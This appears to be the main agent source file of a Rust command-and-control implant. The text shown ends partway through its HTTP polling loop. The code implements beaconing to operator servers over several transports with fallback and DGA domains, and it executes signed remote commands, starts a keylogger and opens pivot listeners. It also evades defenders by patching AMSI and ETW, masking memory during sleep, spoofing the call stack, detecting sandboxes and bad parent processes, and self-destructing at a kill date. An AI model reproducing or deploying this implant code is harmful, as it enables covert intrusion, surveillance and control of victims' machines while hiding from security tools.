pub mod config;
pub mod handlers;
pub mod scripting;
pub mod pivot;
pub mod injection;
pub mod keylogger;
pub mod evasion;
pub mod jobs;
pub mod inmem;
pub mod migrate;
pub mod artifacts;
pub mod persistence;
pub mod http_transport;
pub mod fallback;
pub mod syscalls;
pub mod hibernation;
pub mod dga;

use tokio::sync::mpsc;
use std::sync::{Arc, Mutex};
use ed25519_dalek::{VerifyingKey, Signature, Verifier};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use rand::{Rng, RngCore};
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce
};
use rand::rngs::OsRng;
use zeroize::Zeroize;

use crate::common::{ClientHello, SecuredCommand, PivotFrame, C2Config, MalleableProfile};
use crate::utils;
use crate::transport::ClientTransport;
use crate::strcrypt_rt;
use strcrypt::aes_str;
use crate::traffic::DataMolder;

use self::handlers::{HandlerContext, AgentAction};
use self::scripting::ExtensionManager;
use self::pivot::PivotManager;
use self::jobs::JobManager;

/// Masking strategy selected by the build-time `sleep_mask` value.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum SleepMaskKind {
    /// Operator disabled sleep obfuscation: plain sleep, no masking.
    Plain,
    /// Fiber stack spoof only - no Ekko timer-queue wake, no PE header
    /// erasure. The config is still AES-encrypted during the sleep.
    SpoofedStack,
    /// Full Ekko mask (config encryption + PE header erasure + timer
    /// dispatch + fiber stack spoof).
    Ekko,
}

/// Map a build-time `sleep_mask` value to its masking strategy. Unknown
/// spellings fail safe toward maximum masking (Ekko).
fn classify_sleep_mask(value: &str) -> SleepMaskKind {
    match value {
        "plain" | "none" => SleepMaskKind::Plain,
        "spoofed-stack" => SleepMaskKind::SpoofedStack,
        _ => SleepMaskKind::Ekko,
    }
}

// Enhanced Sleep Mask: encrypts config + process heap, uses fiber-based
// stack spoofing so the agent's call stack is clean during sleep.
async fn sleep_with_mask(config: C2Config, duration: std::time::Duration) -> C2Config {
    let mask_kind = classify_sleep_mask(&config.sleep_mask);
    // "plain"/"none": operator explicitly disabled sleep obfuscation at
    // build time - plain sleep, no config encryption, no stack/PE masking.
    if mask_kind == SleepMaskKind::Plain {
        return tokio::task::spawn_blocking(move || {
            std::thread::sleep(duration);
            config
        }).await.unwrap_or_else(|_| crate::agent::config::load());
    }
    let spoof_only = mask_kind == SleepMaskKind::SpoofedStack;
    // Unknown mask spellings fail safe toward maximum masking (Ekko); note
    // it so debug builds can catch a typo'd builder/config value.
    if mask_kind == SleepMaskKind::Ekko && config.sleep_mask != aes_str!("ekko") {
        tracing::debug!("{}: '{}' {}",
            aes_str!("Unknown sleep_mask"), config.sleep_mask,
            aes_str!("- expected none, ekko or spoofed-stack, falling back to ekko"));
    }
    let config_bytes = serde_json::to_vec(&config).unwrap_or_default();

    // Perform all cryptographic operations inside spawn_blocking so key material
    // lives on a dedicated thread stack, not the tokio executor's stack/heap
    // where it persists across await points and is visible to memory scanners.
    let sleep_ms = duration.as_millis() as u32;
    // Build-time evasion flags: stack_spoof=false skips the fiber stack
    // spoof (config encryption still applies); heap_encrypt=true adds AES
    // heap encryption for the sleep window (Windows only).
    let stack_spoof_flag = config.stack_spoof;
    let heap_encrypt_flag = config.heap_encrypt;

    let result = tokio::task::spawn_blocking(move || {
        // 1. Generate keys and encrypt config - all on this thread's stack
        let mut key = [0u8; 32];
        let mut nonce_bytes = [0u8; 12];
        OsRng.fill_bytes(&mut key);
        OsRng.fill_bytes(&mut nonce_bytes);

        let aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key);
        let cipher = Aes256Gcm::new(aes_key);
        let nonce = Nonce::from_slice(&nonce_bytes);

        let ciphertext = match cipher.encrypt(nonce, config_bytes.as_ref()) {
            Ok(ct) => ct,
            Err(_) => {
                // Encryption failed - sleep masked and return config as-is.
                if !stack_spoof_flag {
                    std::thread::sleep(std::time::Duration::from_millis(sleep_ms as u64));
                } else if spoof_only {
                    evasion::sleep_with_spoofed_stack(sleep_ms);
                } else {
                    // Ekko mask (PE header erasure + timer dispatch + fiber
                    // stack spoof).
                    evasion::ekko_sleep(sleep_ms);
                }
                return config_bytes;
            }
        };
        
        // Zeroize the plaintext config bytes IMMEDIATELY after encryption.
        // Without this, serde's serialized JSON (containing C2 hosts, keys,
        // etc.) sits in freed heap memory during the entire sleep phase,
        // completely visible to memory scanners. The config is safely stored
        // in `ciphertext` now - we don't need the plaintext anymore.
        let mut config_bytes = config_bytes; // rebind as mut for zeroize
        config_bytes.zeroize();
        
        // Drop the cipher BEFORE sleeping. The Aes256Gcm struct contains the
        // expanded AES key schedule (240 bytes of derived round keys) on the
        // stack. If it's still alive during sleep, a memory scanner walking
        // the thread's stack will find the key material and decrypt the config.
        drop(cipher);
        
        // 2. Sleep with stack spoofing.
        //
        // DESIGN NOTE: We intentionally do NOT suspend threads or encrypt
        // the process heap here. The agent runs on a multi-threaded Tokio
        // runtime whose worker threads service I/O completions, timers, and
        // the task scheduler. Suspending them (even briefly) can deadlock
        // the runtime if a worker holds an internal scheduler lock, and
        // breaks active pivot listeners, proxy tunnels, and HTTP polling.
        //
        // ekko_sleep handles the sleep with three additional protections
        // beyond a plain Sleep():
        //
        //   Gap 1 - PE header erasure: The MZ/PE header region is zeroed
        //     for the duration of the sleep and restored on wakeup. This
        //     strips field-value signatures (magic, timestamp, EntryPoint
        //     RVA) that memory scanners match without touching executed code.
        //
        //   Gap 3 - Timer-thread dispatch: The wake signal comes from a
        //     Windows timer-pool thread via CreateTimerQueueTimer; no agent
        //     code runs on the timer thread (SetEvent is used directly as
        //     the callback so the thread's entire stack is ntdll/kernel32).
        //
        //   Gap 4 - Fiber stack spoof: The sleeping thread converts to a
        //     fiber and parks inside a clean fiber blocked on the wake event.
        //     Stack walkers see only ntdll!NtWaitForSingleObject -
        //     no unbacked agent frames during sleep.
        //
        // The C2Config JSON is already AES-256-GCM encrypted above (Gap 1
        // for data). Full .text content encryption is deferred to reflective-
        // load deployments (see docs/evasion.md).

        // Opt-in heap encryption for the sleep window (build flag
        // heap_encrypt). The walk runs on this blocking thread without
        // suspending the Tokio runtime; on failure we simply sleep without
        // it rather than skipping the sleep.
        #[cfg(target_os = "windows")]
        let heap_key: Option<([u8; 32], [u8; 12])> = if heap_encrypt_flag {
            let mut hk = [0u8; 32];
            let mut hn = [0u8; 12];
            OsRng.fill_bytes(&mut hk);
            OsRng.fill_bytes(&mut hn);
            match evasion::encrypt_heap_aes256gcm(&hk, &hn) {
                Ok(_) => Some((hk, hn)),
                Err(_) => None,
            }
        } else {
            None
        };
        // Flag is only consumed by the Windows heap walk above.
        #[cfg(not(target_os = "windows"))]
        let _ = heap_encrypt_flag;

        if !stack_spoof_flag {
            // Build flag stack_spoof=false: config stays AES-encrypted
            // above, but no fiber spoof / Ekko timer games - plain sleep.
            std::thread::sleep(std::time::Duration::from_millis(sleep_ms as u64));
        } else if spoof_only {
            // Fiber stack spoof WITHOUT the Ekko timer-queue wake / PE
            // header erasure (config.example.toml: "spoofed-stack").
            evasion::sleep_with_spoofed_stack(sleep_ms);
        } else {
            evasion::ekko_sleep(sleep_ms);
        }

        #[cfg(target_os = "windows")]
        if let Some((hk, hn)) = heap_key {
            let _ = evasion::decrypt_heap_aes256gcm(&hk, &hn);
        }

        // 3. Decrypt config
        let aes_key_decrypt = aes_gcm::Key::<Aes256Gcm>::from_slice(&key);
        let cipher_decrypt = Aes256Gcm::new(aes_key_decrypt);
        
        let decrypted = cipher_decrypt.decrypt(nonce, ciphertext.as_ref());
        // Drop cipher before zeroing its key source
        drop(cipher_decrypt);

        let result = match decrypted {
            Ok(plaintext) => plaintext,
            // config_bytes was zeroized after encryption - can't use as fallback.
            // Return empty vec; the outer code falls back to config_backup.
            Err(_) => Vec::new(),
        };
        
        // Zero key material using zeroize crate - guarantees the compiler
        // won't optimize out the zeroing. Handles underlying memory copies
        // that write_volatile would miss (inside cipher structs, stack padding, etc.)
        key.zeroize();
        nonce_bytes.zeroize();
        
        result
    }).await.unwrap_or_else(|_| serde_json::to_vec(&config).unwrap_or_default());

    let mut config_backup = serde_json::to_vec(&config).unwrap_or_default();

    // Zero the original config's sensitive heap-allocated fields. When the
    // allocator frees these Strings, the backing memory goes to the free list.
    // Without zeroing, plaintext C2 hostnames, keys, and salts persist in freed
    // heap blocks indefinitely, completely defeating the heap encryption above.
    let mut config = config; // rebind as mutable to zeroize fields
    config.c2_host.zeroize();
    config.server_public_key.zeroize();
    config.hash_salt.zeroize();
    config.build_id.zeroize();
    config.profile.user_agent.zeroize();
    for ep in &mut config.fallback.endpoints {
        ep.host.zeroize();
    }
    drop(config);

    // Zero the plaintext result bytes after deserialization - the decrypted
    // config would otherwise persist on the freed heap indefinitely, rendering
    // the AES encryption during sleep useless against a memory dump.
    let mut result_buf = result;
    let parsed_config = serde_json::from_slice(&result_buf).unwrap_or_else(|_| {
        serde_json::from_slice(&config_backup).unwrap_or_else(|_| crate::agent::config::load())
    });
    result_buf.zeroize();
    config_backup.zeroize();
    parsed_config
}

pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
    // [OPSEC] Panic suppression - no stack traces to disk or stderr.
    // Instead of completely swallowing panics (which makes logic bugs
    // impossible to diagnose), capture the last panic message in a static
    // buffer that can be queried by the C2 operator for diagnostics.
    std::panic::set_hook(Box::new(|info| {
        use std::sync::OnceLock;
        static LAST_PANIC: OnceLock<std::sync::Mutex<String>> = OnceLock::new();
        let buf = LAST_PANIC.get_or_init(|| std::sync::Mutex::new(String::new()));
        if let Ok(mut s) = buf.lock() {
            *s = format!("{}", info);
            // Truncate to prevent memory bloat from large panic payloads
            s.truncate(512);
        }
    }));

    let mut config = config::load();

    // Fail fast on a build whose fallback endpoints disagree with the
    // embedded transport (e.g. an HTTP build with TCP-only fallbacks):
    // the agent would dial endpoints it cannot speak to.
    fallback::validate_transport_consistency(&config)?;

    // Check Kill Date Immediately
    if let Some(kill_ts) = config.kill_date {
        let now = chrono::Utc::now().timestamp();
        if now > kill_ts {
            utils::self_destruct();
        }
    }

    if !config.debug {
        // UPDATE PATH HERE: self::evasion or just evasion
        if evasion::is_virtualized() { evasion::run_decoy(); }

        // Parent process validation (T1134.004 awareness).
        // If valid_parents is non-empty in the build config and the agent's
        // actual parent is not on the list, we're running in an unexpected
        // spawn context - likely a sandbox or analyst double-click.
        // run_decoy() exits after printing a plausible error so the process
        // tree tells analysts nothing interesting.
        if evasion::is_bad_parent(&config.valid_parents) { evasion::run_decoy(); }

        // Build-time execution guardrails (target lock-in): domain,
        // hostname, active-hours window, no-root/SYSTEM. A trip uses the
        // same decoy exit as the VM check - nothing is printed on
        // non-debug builds (OPSEC).
        if evasion::guardrail_violation(&config).is_some() { evasion::run_decoy(); }
    } else if let Some(reason) = evasion::guardrail_violation(&config) {
        // Debug builds keep running but say which rail tripped.
        println!("{}: {}", aes_str!("[!] Guardrail tripped (debug - continuing)"), reason);
    }

    // Build-time evasion flag: patch AMSI/ETW at startup (default true)
    // instead of waiting for a manual evasion:patch_* command. Best-effort:
    // a failed patch must not stop the agent from running.
    #[cfg(target_os = "windows")]
    if config.patch_amsi_etw {
        match evasion::patch_amsi() {
            Ok(m)  => if config.debug { println!("{}", m); },
            Err(e) => if config.debug { println!("{}: {}", aes_str!("[-] AMSI patch failed"), e); },
        }
        match evasion::patch_etw() {
            Ok(m)  => if config.debug { println!("{}", m); },
            Err(e) => if config.debug { println!("{}: {}", aes_str!("[-] ETW patch failed"), e); },
        }
    }

    let hwid = utils::get_persistent_id();
    let exe_id = utils::generate_exe_id(&config.hash_salt);
    
    let mut base_sleep = config.sleep_interval;
    let mut base_jitter_min = config.jitter_min;
    let mut base_jitter_max = config.jitter_max;
    
    let mut is_active_mode = false;
    
    let proxy_handle = Arc::new(Mutex::new(None));
    let rportfwd_handles = Arc::new(Mutex::new(Vec::new()));
    let ext_manager = Arc::new(Mutex::new(ExtensionManager::new()));

    // Keylogger buffer + background flush thread. Capture itself is
    // Windows-only, so on other OSes skip the init: it would only spawn a
    // flush loop and create the storage dir on disk for nothing. On
    // Windows the storage lives under %LOCALAPPDATA% in a machine-derived
    // subdir, not the CWD.
    #[cfg(target_os = "windows")]
    let _ = keylogger::init_buffer();

    let server_pub = BASE64.decode(&config.server_public_key)?;
    let pub_bytes: [u8; 32] = server_pub.try_into()
        .map_err(|_| aes_str!("Invalid server public key length (expected 32 bytes)"))?;
    let verify_key = VerifyingKey::from_bytes(&pub_bytes)?;

    if config.debug {
        println!("{}: {}", aes_str!("[*] Client Started. ID"), hwid);
    }

    // ── Hibernation mode dispatch ──────────────────────────────────────
    if config.hibernation_mode {
        return hibernation::run_hibernation(config, hwid, exe_id, verify_key).await;
    }

    // ── HTTP(S) Transport Mode ─────────────────────────────────────────
    if config.transport == crate::common::TransportProtocol::Http
        || config.transport == crate::common::TransportProtocol::Https
    {
        return run_http_mode(
            config, hwid, exe_id, verify_key,
            proxy_handle, rportfwd_handles, ext_manager,
        ).await;
    }

    // ── TCP/TLS/Pipe Transport Mode ────────────────────────────────────
    let mut fb_mgr = fallback::FallbackManager::from_config(&config);
    let mut connect_failures: u32 = 0;
    // Signed-command replay guard. Lives outside the connection scope so a
    // reconnect does not reset it and reopen the replay window for commands
    // already executed on a previous session.
    let mut last_counter = 0u64;

    // Persistent outbound queue, dispatcher, and pivot manager. All three
    // live OUTSIDE the reconnect loop: pivot listeners keep accepting (and
    // their upstream frames keep flowing) across C2 reconnects, and output
    // produced during an outage is buffered (bounded, drop-oldest) until
    // the next connection drains it.
    let (tx, mut outbox_rx) = mpsc::channel::<Vec<u8>>(100);
    let (sink_tx, sink_rx) = tokio::sync::watch::channel::<Option<mpsc::Sender<Vec<u8>>>>(None);
    let pivot_mgr = Arc::new(tokio::sync::Mutex::new(PivotManager::new(tx.clone())));
    {
        let mut sink_rx = sink_rx.clone();
        let debug = config.debug;
        tokio::spawn(async move {
            let mut buf: std::collections::VecDeque<Vec<u8>> = std::collections::VecDeque::new();
            const MAX_BUFFERED: usize = 256;
            loop {
                let sink = sink_rx.borrow().clone();
                match sink {
                    Some(sink) => {
                        // Drain anything buffered during the outage first.
                        while let Some(d) = buf.pop_front() {
                            if let Err(e) = sink.send(d).await {
                                buf.push_front(e.0);
                                break;
                            }
                        }
                        if !buf.is_empty() {
                            // Sink died mid-drain: wait for the next connection.
                            let _ = sink_rx.changed().await;
                            continue;
                        }
                        tokio::select! {
                            d = outbox_rx.recv() => match d {
                                Some(d) => {
                                    if let Err(e) = sink.send(d).await {
                                        buf.push_front(e.0);
                                        let _ = sink_rx.changed().await;
                                    }
                                }
                                None => break, // every sender dropped: agent shutting down
                            },
                            _ = sink_rx.changed() => {}
                        }
                    }
                    None => {
                        tokio::select! {
                            d = outbox_rx.recv() => match d {
                                Some(d) => {
                                    if buf.len() >= MAX_BUFFERED {
                                        buf.pop_front();
                                        if debug { eprintln!("{}", aes_str!("[-] Outbound buffer full - dropped oldest message")); }
                                    }
                                    buf.push_back(d);
                                }
                                None => break,
                            },
                            _ = sink_rx.changed() => {}
                        }
                    }
                }
            }
        });
    }

    loop {
        // DGA domains rotate per time window (docs/fallback.md); check the
        // rollover on every connection attempt so a long-running agent does
        // not beacon yesterday's domains forever.
        if fb_mgr.rotate_dga_if_window_changed(&config) && config.debug {
            eprintln!("{}", aes_str!("[*] DGA window rolled - endpoint list rotated"));
        }
        // Select endpoint from fallback manager
        let resolved = match fb_mgr.next_endpoint(&config) {
            Some(ep) => ep,
            None => {
                tokio::time::sleep(std::time::Duration::from_secs(10)).await;
                continue;
            }
        };
        let ep_index = resolved.index;

        // Build a temporary config for this endpoint
        let mut ep_config = config.clone();
        ep_config.c2_host = resolved.host.clone();
        ep_config.tunnel_port = resolved.port;
        ep_config.transport = resolved.transport.clone();
        ep_config.profile = resolved.profile.clone();
        ep_config.proxy = resolved.proxy.clone();

        if config.debug {
            eprintln!("{}: {}:{} ({:?})", aes_str!("[*] Trying endpoint"), resolved.host, resolved.port, resolved.transport);
        }

        let transport = ClientTransport::new(&ep_config);
        let stream_result = transport.connect().await;

        if let Err(ref e) = stream_result {
            fb_mgr.record_failure(ep_index);
            if config.debug {
                eprintln!("{} ({}:{}): {}", aes_str!("[-] Connection Failed"), resolved.host, resolved.port, e);
            }
            let base_delay = std::cmp::min(5u64 * 2u64.saturating_pow(connect_failures), 300);
            let jitter = rand::thread_rng().gen_range(0..=base_delay / 2);
            let delay = base_delay + jitter;
            connect_failures = connect_failures.saturating_add(1);
            tokio::time::sleep(std::time::Duration::from_secs(delay)).await;
            continue;
        }
        fb_mgr.record_success(ep_index);
        connect_failures = 0;

        if let Ok(stream) = stream_result {
            let (mut reader, mut writer) = tokio::io::split(stream);
            // Per-connection sink the persistent dispatcher forwards to.
            let (conn_tx, mut conn_rx) = mpsc::channel::<Vec<u8>>(100);
            let (cmd_tx, mut cmd_rx) = mpsc::channel::<SecuredCommand>(100);

            let job_mgr = JobManager::new_shared(tx.clone());
            let _ = sink_tx.send(Some(conn_tx));

            // 1. Writer Task (Handshake Logic)
            let active_profile_tx = config.profile.clone();
            let handshake_profile = MalleableProfile::default();

            tokio::spawn(async move {
                let mut handshake_sent = false;

                while let Some(data) = conn_rx.recv().await {
                    let profile_to_use = if !handshake_sent {
                        &handshake_profile
                    } else {
                        &active_profile_tx
                    };

                    if DataMolder::send(&mut writer, &data, profile_to_use).await.is_err() { 
                        break; 
                    }
                    handshake_sent = true;
                }
            });

            // 2. Handshake Payload
            let reg_ts = chrono::Utc::now().to_rfc3339();
            let auth_hmac = compute_auth_hmac(&config.challenge_key, &config.build_id, &exe_id, &reg_ts);
            let hello = ClientHello {
                hostname: hostname::get().unwrap_or(aes_str!("unknown").into()).to_string_lossy().into(),
                os: std::env::consts::OS.to_string(),
                computer_id: hwid.clone(),
                exe_id: exe_id.clone(),
                build_id: config.build_id.clone(),
                auth_hmac,
                reg_timestamp: reg_ts,
                interfaces: crate::utils::get_network_interfaces(),
                hibernation_mode: false,
                task_batch_size: config.task_batch_size,
            };
            if let Ok(j) = serde_json::to_vec(&hello) { let _ = tx.send(j).await; }

            // 2b. Handle challenge-response if challenge_key is configured
            if !config.challenge_key.is_empty() {
                // Small delay to let the writer task flush the hello
                tokio::time::sleep(std::time::Duration::from_millis(100)).await;

                // Read next message from server. Could be a challenge (new server)
                // or a regular command (old server without challenge support).
                let handshake_profile = crate::common::MalleableProfile::default();
                let first_msg = match DataMolder::recv(&mut reader, &handshake_profile).await {
                    Ok(b) => b,
                    Err(_) => {
                        if config.debug { eprintln!("{}", aes_str!("[-] Failed to receive from server")); }
                        continue;
                    }
                };

                // Try to parse as a challenge
                if let Ok(challenge) = serde_json::from_slice::<crate::common::HandshakeChallenge>(&first_msg) {
                    // Verify server's ed25519 signature
                    let sig_bytes = match BASE64.decode(&challenge.server_proof) {
                        Ok(b) => b,
                        Err(_) => { continue; }
                    };
                    let sig_arr: [u8; 64] = match sig_bytes.try_into() {
                        Ok(a) => a,
                        Err(_) => { continue; }
                    };
                    let sig = ed25519_dalek::Signature::from_bytes(&sig_arr);
                    if verify_key.verify(challenge.nonce.as_bytes(), &sig).is_err() {
                        if config.debug { eprintln!("{}", aes_str!("[-] Server proof failed — aborting")); }
                        continue;
                    }

                    // Server verified - compute HMAC response
                    let key_bytes = match BASE64.decode(&config.challenge_key) {
                        Ok(b) => b,
                        Err(_) => { continue; }
                    };

                    use hmac::{Hmac, Mac};
                    use sha2::Sha256;
                    type HmacSha256 = Hmac<Sha256>;

                    let mut mac = match <HmacSha256 as Mac>::new_from_slice(&key_bytes) {
                        Ok(m) => m,
                        Err(_) => { continue; }
                    };
                    mac.update(challenge.nonce.as_bytes());
                    mac.update(config.build_id.as_bytes());
                    let result = BASE64.encode(mac.finalize().into_bytes());

                    let response = crate::common::HandshakeResponse { hmac: result };
                    if let Ok(resp_data) = serde_json::to_vec(&response) {
                        let _ = tx.send(resp_data).await;
                        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
                    }
                }
                // If it's not a challenge (old server), the data is a command.
                // It will be lost since we already consumed it from the stream.
                // This is acceptable: the first command on an old server is typically
                // an auto-recon that will be re-sent on the next check-in cycle.
            }

            // 3. Reader Task
            let active_profile_rx = config.profile.clone();
            let pivot_mgr_clone = pivot_mgr.clone();
            
            tokio::spawn(async move {
                loop {
                    let buf = match DataMolder::recv(&mut reader, &active_profile_rx).await {
                        Ok(b) => b,
                        Err(_) => break,
                    };

                    if let Ok(frame) = serde_json::from_slice::<PivotFrame>(&buf) {
                        pivot_mgr_clone.lock().await.handle_downstream_frame(frame);
                        continue;
                    }

                    if let Ok(msg) = serde_json::from_slice::<SecuredCommand>(&buf) {
                        if cmd_tx.send(msg).await.is_err() { break; }
                    }
                }
            });

            // 3b. Auto-cascade pivot listener.
            //
            // If this agent was built with auto_pivot_port set, start a TCP
            // pivot listener on that port immediately after the handshake
            // completes. This pre-wires the next hop in a multi-hop chain
            // without requiring the operator to manually issue
            // pivot:listener_tcp for each intermediate node after it connects.
            //
            // The listener starts in a detached background task so it does not
            // block the main executor loop below. On failure (e.g. port already
            // in use), the error is logged in debug mode and the agent continues
            // normally - the operator can still start the listener manually.
            if let Some(port) = config.auto_pivot_port {
                let cascade_mgr = pivot_mgr.clone();
                let debug = config.debug;
                tokio::spawn(async move {
                    let result = cascade_mgr.lock().await.start_agent_listener(port).await;
                    if debug {
                        match result {
                            Ok(msg) => eprintln!("{}: {}", aes_str!("[Pivot] Auto-cascade"), msg),
                            Err(e) => eprintln!("{}: {}", aes_str!("[Pivot] Auto-cascade failed"), e),
                        }
                    }
                });
            }

            // 4. Main Executor
            while let Some(msg) = cmd_rx.recv().await {
                if msg.counter <= last_counter { continue; }
                
                let sign_bytes = msg.get_signable_bytes();
                let sig_bytes = BASE64.decode(&msg.signature).unwrap_or_default();
                let sig_arr: [u8; 64] = sig_bytes.try_into().unwrap_or([0u8; 64]);
                let sig = Signature::from_bytes(&sig_arr);

                if verify_key.verify(&sign_bytes, &sig).is_ok() {
                    last_counter = msg.counter;
                    if msg.command == aes_str!("exit") { return Ok(()); }

                    let ctx = HandlerContext {
                        proxy_handle: proxy_handle.clone(),
                        rportfwd_handles: rportfwd_handles.clone(),
                        ext_manager: ext_manager.clone(),
                        job_manager: job_mgr.clone(),
                        c2_host: ep_config.c2_host.clone(),
                        tx: tx.clone(),
                        pivot_mgr: pivot_mgr.clone(),
                    };

                    match handlers::dispatch(&ctx, msg).await {
                        AgentAction::UpdateConfig(s, min, max) => {
                            base_sleep = s;
                            base_jitter_min = min;
                            base_jitter_max = max;
                        },
                        AgentAction::UpdateFallback(fb) => {
                            // Hot-swap: re-seed the fallback manager. The live
                            // session is untouched; the new endpoints are used
                            // from the next reconnect of the outer loop.
                            config.fallback = fb;
                            fb_mgr = fallback::FallbackManager::from_config(&config);
                        },
                        AgentAction::SetMode(active) => {
                            is_active_mode = active;
                        },
                        AgentAction::None => {}
                    }

                    if is_active_mode {
                        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
                    }
                }
            }

            // Connection is down: park the dispatcher (it buffers output
            // for the next connection instead of dropping it).
            let _ = sink_tx.send(None);
        }

        // 5. Sleep with Memory Encryption (Passive Mode)
        if !is_active_mode {
            let base_ms = if base_sleep > 0 { base_sleep * 1000 } else { 5000 };
            let safe_min = base_jitter_min;
            let safe_max = if base_jitter_max < safe_min { safe_min } else { base_jitter_max };

            let jitter_ms = if safe_max > 0 {
                rand::thread_rng().gen_range(safe_min..=safe_max) as u64
            } else { 0 };
            
            let sleep_duration = std::time::Duration::from_millis(base_ms + jitter_ms);

            config = sleep_with_mask(config, sleep_duration).await;
        } else {
            tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
        }

        // Check Kill Date on Wake
        if let Some(kill_ts) = config.kill_date {
            if chrono::Utc::now().timestamp() > kill_ts {
                utils::self_destruct();
            }
        }
    }
}

/// HTTP(S) transport main loop. Uses polling instead of persistent connections.
///
/// Session lifecycle: register -> poll/process/flush -> on session loss
/// (decoy page, 4xx, repeated transport failures) re-register with capped
/// exponential backoff, walking fallback endpoints via the shared
/// FallbackManager. Results that cannot be delivered are held in a bounded
/// Outbox and flushed after re-registration; the outbound channel and
/// PivotManager live outside the session loop so pivot listeners and
/// queued output survive re-registration.
async fn run_http_mode(
    mut config: crate::common::C2Config,
    hwid: String,
    exe_id: String,
    verify_key: VerifyingKey,
    proxy_handle: Arc<Mutex<Option<tokio::task::AbortHandle>>>,
    rportfwd_handles: Arc<Mutex<Vec<handlers::RportfwdHandle>>>,
    ext_manager: Arc<Mutex<ExtensionManager>>,
) -> Result<(), Box<dyn std::error::Error>> {

    /// Consecutive transport-level poll failures tolerated before the
    /// session is declared dead and the loop re-registers (failover).
    const MAX_POLL_FAILURES: u32 = 5;

    let mut fb_mgr = fallback::FallbackManager::from_config(&config);

    // Channel for outbound results (handlers send via tx, we POST them) and
    // the pivot manager: both live OUTSIDE the session loop so a
    // re-registration does not orphan queued results or black-hole listeners.
    let (tx, mut rx) = tokio::sync::mpsc::channel::<Vec<u8>>(100);
    let pivot_mgr = Arc::new(tokio::sync::Mutex::new(PivotManager::new(tx.clone())));
    let job_mgr = JobManager::new_shared(tx.clone());

    // Auto-cascade pivot listener for HTTP mode. Semantics are identical to
    // TCP/TLS mode: the listener is raw TCP regardless of the upstream
    // transport, and it survives re-registration because the manager and
    // channel outlive any single session.
    if let Some(port) = config.auto_pivot_port {
        let cascade_mgr = pivot_mgr.clone();
        let debug = config.debug;
        tokio::spawn(async move {
            let result = cascade_mgr.lock().await.start_agent_listener(port).await;
            if debug {
                match result {
                    Ok(msg) => eprintln!("{}: {}", aes_str!("[HTTP Pivot] Auto-cascade"), msg),
                    Err(e) => eprintln!("{}: {}", aes_str!("[HTTP Pivot] Auto-cascade failed"), e),
                }
            }
        });
    }

    let mut base_sleep = config.sleep_interval;
    let mut base_jitter_min = config.jitter_min;
    let mut base_jitter_max = config.jitter_max;
    let mut last_counter = 0u64;
    let mut is_active_mode = false;
    // Results that could not be delivered: survives re-registration.
    let mut outbox = http_transport::Outbox::new();
    // Profile URI rotator shared by poll/result/pivot posts.
    let mut uris = http_transport::UriRotator::new();
    let mut reg_attempts: u32 = 0;

    'session: loop {
        // ── Registration phase ─────────────────────────────────────────
        let (client, base, token, initial_cmds, active_host, ep_idx, ep_profile) = loop {
            // DGA domains rotate per time window; check on every attempt.
            if fb_mgr.rotate_dga_if_window_changed(&config) && config.debug {
                eprintln!("{}", aes_str!("[*] DGA window rolled - endpoint list rotated"));
            }
            let resolved = match fb_mgr.next_endpoint(&config) {
                Some(ep) => ep,
                None => {
                    tokio::time::sleep(std::time::Duration::from_secs(10)).await;
                    continue;
                }
            };
            let ep_idx = resolved.index;

            let mut ep_config = config.clone();
            ep_config.c2_host = resolved.host.clone();
            ep_config.tunnel_port = resolved.port;
            ep_config.transport = resolved.transport.clone();
            ep_config.profile = resolved.profile.clone();
            ep_config.proxy = resolved.proxy.clone();

            if config.debug { eprintln!("{}: {}:{}", aes_str!("[*] HTTP: trying"), resolved.host, resolved.port); }

            let c = match http_transport::build_client(&ep_config) {
                Ok(c) => c,
                Err(e) => {
                    fb_mgr.record_failure(ep_idx);
                    if config.debug { eprintln!("{}: {}", aes_str!("[-] Client build failed"), e); }
                    tokio::time::sleep(std::time::Duration::from_secs(5)).await;
                    continue;
                }
            };
            let b = http_transport::base_url(&ep_config);

            // Fresh hello per attempt: the HMAC covers the registration
            // timestamp, so a stale hello would fail freshness checks.
            let reg_ts = chrono::Utc::now().to_rfc3339();
            let auth_hmac = compute_auth_hmac(&config.challenge_key, &config.build_id, &exe_id, &reg_ts);
            let hello = ClientHello {
                hostname: hostname::get().unwrap_or(aes_str!("unknown").into()).to_string_lossy().into(),
                os: std::env::consts::OS.to_string(),
                computer_id: hwid.clone(),
                exe_id: exe_id.clone(),
                build_id: config.build_id.clone(),
                auth_hmac,
                reg_timestamp: reg_ts,
                interfaces: crate::utils::get_network_interfaces(),
                hibernation_mode: false,
                task_batch_size: config.task_batch_size,
            };

            match http_transport::register(&c, &b, &hello).await {
                Ok((tok, cmds)) => {
                    fb_mgr.record_success(ep_idx);
                    reg_attempts = 0;
                    break (c, b, tok, cmds, ep_config.c2_host.clone(), ep_idx, ep_config.profile.clone());
                }
                Err(e) => {
                    fb_mgr.record_failure(ep_idx);
                    // Capped exponential backoff with retry budget reporting
                    // (same policy as TCP mode) instead of a fixed 10 s loop.
                    let base_delay = std::cmp::min(5u64 * 2u64.saturating_pow(reg_attempts), 300);
                    let jitter = rand::thread_rng().gen_range(0..=base_delay / 2);
                    let delay = base_delay + jitter;
                    reg_attempts = reg_attempts.saturating_add(1);
                    if config.debug {
                        eprintln!("{} ({}:{}): {} ({} {}, {} {}s)",
                            aes_str!("[-] HTTP register failed"), resolved.host, resolved.port, e,
                            aes_str!("attempt"), reg_attempts, aes_str!("retrying in"), delay);
                    }
                    tokio::time::sleep(std::time::Duration::from_secs(delay)).await;
                }
            }
        };

        if config.debug { println!("{} {}", aes_str!("[+] HTTP registered at"), base); }

        // Process initial commands from registration
        for cmd in initial_cmds {
            process_http_command(
                &cmd, &verify_key, &mut last_counter,
                &proxy_handle, &rportfwd_handles, &ext_manager, &job_mgr,
                &active_host, &tx, &pivot_mgr,
            ).await;
        }

        let mut poll_failures: u32 = 0;

        // ── Session phase: poll / process / flush ──────────────────────
        loop {
            // 1. Collect freshly produced outbound items: results queue in
            // the outbox; pivot frames are live socket data - sent once and
            // never requeued (stale frames would corrupt the linked stream).
            while let Ok(data) = rx.try_recv() {
                match http_transport::classify_outbound(&data) {
                    Some(http_transport::OutboundItem::Result(resp)) => outbox.push(resp, config.debug),
